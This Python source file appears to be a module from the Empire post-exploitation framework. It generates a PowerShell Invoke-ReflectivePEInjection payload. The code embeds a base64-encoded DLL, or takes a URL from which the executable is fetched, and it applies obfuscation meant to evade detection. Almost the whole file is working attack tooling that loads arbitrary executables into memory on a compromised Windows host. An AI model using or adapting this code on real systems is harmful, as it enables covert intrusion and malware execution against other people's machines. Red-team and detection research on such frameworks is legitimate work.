from __future__ import print_function

from builtins import str
from builtins import object
from empire.server.common import helpers
import base64
from typing import Dict

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        
        # read in the common module source code
        module_source = main_menu.installPath + "/data/module_source/management/Invoke-ReflectivePEInjection.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            f = open(module_source, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
            return ""

        module_code = f.read()
        f.close()

        script = module_code

        script_end = "\nInvoke-ReflectivePEInjection"

        #check if dllpath or PEUrl is set. Both are required params in their respective parameter sets.
        if params['DllPath'] == "" and params['PEUrl'] == "":
            print(helpers.color("[!] Please provide a PEUrl or DllPath"))
            return ""
        for option,values in params.items():
            if option.lower() != "agent":
                if option.lower() == "dllpath":
                    if values != "":
                       try:
                            f = open(values, 'rb')
                            dllbytes = f.read()
                            f.close()

                            base64bytes = base64.b64encode(dllbytes).decode('UTF-8')

                            script_end = "\n$PE =  [Convert]::FromBase64String(\'" + base64bytes + "\')" + script_end
                            script_end += " -PEBytes $PE"

                       except:
                            print(helpers.color("[!] Error in reading/encoding dll: " + str(values)))
                elif option.lower() == 'forceaslr':
                    if values.lower() == "true":
                        script_end += " -" + str(option)
                elif values.lower() == "true":
                    script_end += " -" + str(option)
                elif values and values != '':
                    script_end += " -" + str(option) + " " + str(values)

        if obfuscate:
            script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=obfuscation_command)
        script += script_end
        script = helpers.keyword_obfuscation(script)

        return script
